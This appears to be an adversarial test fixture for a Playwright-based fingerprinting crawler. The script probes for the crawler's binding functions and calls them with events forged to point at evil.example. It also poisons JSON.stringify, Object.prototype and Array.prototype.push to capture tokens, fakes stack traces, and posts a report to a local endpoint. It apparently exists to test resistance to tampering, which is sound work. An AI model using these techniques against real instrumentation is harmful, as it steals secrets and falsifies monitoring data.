// Script hostil: intenta encontrar el canal de la instrumentación, llamarlo y
// falsificar eventos atribuidos a http://evil.example/forged.js. Reporta lo que logró.
(function () {
  var FORGED = 'http://evil.example/forged.js';
  var report = {found: [], calls: 0, errors: 0, leaked: []};
  var forged = JSON.stringify({t: 'x', c: [['canvas.toDataURL', FORGED, 999]], f: [], v: [['webgl.UNMASKED_RENDERER_WEBGL', FORGED, 'FORGED-RENDERER']], d: [], x: false});

  function attempt(fn, label) {
    try { fn(forged); report.calls++; report.found.push(label); } catch (error) { report.errors++; }
  }

  function probe(win, where) {
    var names = [];
    try { names = Object.getOwnPropertyNames(win); } catch (error) {}
    for (var i = 0; i < names.length; i++) {
      var name = names[i];
      // Candidatos: globales de Playwright y funciones con nombre de aspecto aleatorio.
      var suspicious = /playwright|__pw|binding/i.test(name) || /^_[0-9a-f]{16,}$/.test(name);
      if (!suspicious) continue;
      report.found.push(where + ':' + name);
      var value;
      try { value = win[name]; } catch (error) { continue; }
      if (typeof value === 'function') {
        attempt(value, where + ':call:' + name);
        attempt(function (payload) { value(JSON.stringify({name: name, seq: 1, serializedArgs: [payload]})); }, where + ':raw:' + name);
      }
      if (value && value._bindings) {
        try { value._bindings.forEach(function (_, key) { report.leaked.push(key); attempt(function (p) { value.callBinding(key, p); }, where + ':controller:' + key); }); } catch (error) {}
      }
    }
  }

  // 1. Globales de esta ventana.
  probe(window, 'window');
  // 2. Un iframe recién creado tiene un global nuevo: ¿quedó ahí el canal?
  try {
    var frame = document.createElement('iframe');
    document.documentElement.appendChild(frame);
    probe(frame.contentWindow, 'iframe');
    frame.remove();
  } catch (error) { report.errors++; }

  // 3. Envenenar primitivas para interceptar el payload real (y robar token o nombre).
  var stringify = JSON.stringify;
  JSON.stringify = function (value) {
    var out = stringify.apply(this, arguments);
    if (typeof out === 'string' && /"t":"[0-9a-f]{20,}"|serializedArgs/.test(out)) report.leaked.push(out.slice(0, 300));
    return out;
  };
  Object.prototype.toJSON = function () {
    if (this && (this.t || this.serializedArgs)) report.leaked.push('toJSON:' + stringify(Object.assign({}, this)).slice(0, 300));
    return this;
  };
  var push = Array.prototype.push;
  Array.prototype.push = function () {
    for (var i = 0; i < arguments.length; i++) {
      if (typeof arguments[i] === 'string' && /^[0-9a-f]{40,}$/.test(arguments[i])) report.leaked.push('push:' + arguments[i]);
    }
    return push.apply(this, arguments);
  };
  // 4. Falsificar la atribución: stack fabricado para que las llamadas parezcan de otro script.
  Error.prepareStackTrace = function () { return 'Error\n    at fake (' + FORGED + ':1:1)'; };
  try { document.createElement('canvas').toDataURL(); navigator.userAgent; } catch (error) { report.errors++; }
  delete Error.prepareStackTrace;

  // Genera actividad instrumentada con las primitivas envenenadas y luego limpia y reporta.
  setTimeout(function () {
    try { navigator.platform; screen.width; } catch (error) {}
    setTimeout(function () {
      JSON.stringify = stringify;
      delete Object.prototype.toJSON;
      Array.prototype.push = push;
      fetch('/fp/abuse-report', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: stringify(report)}).catch(function () {});
    }, 1200);
  }, 100);
})();
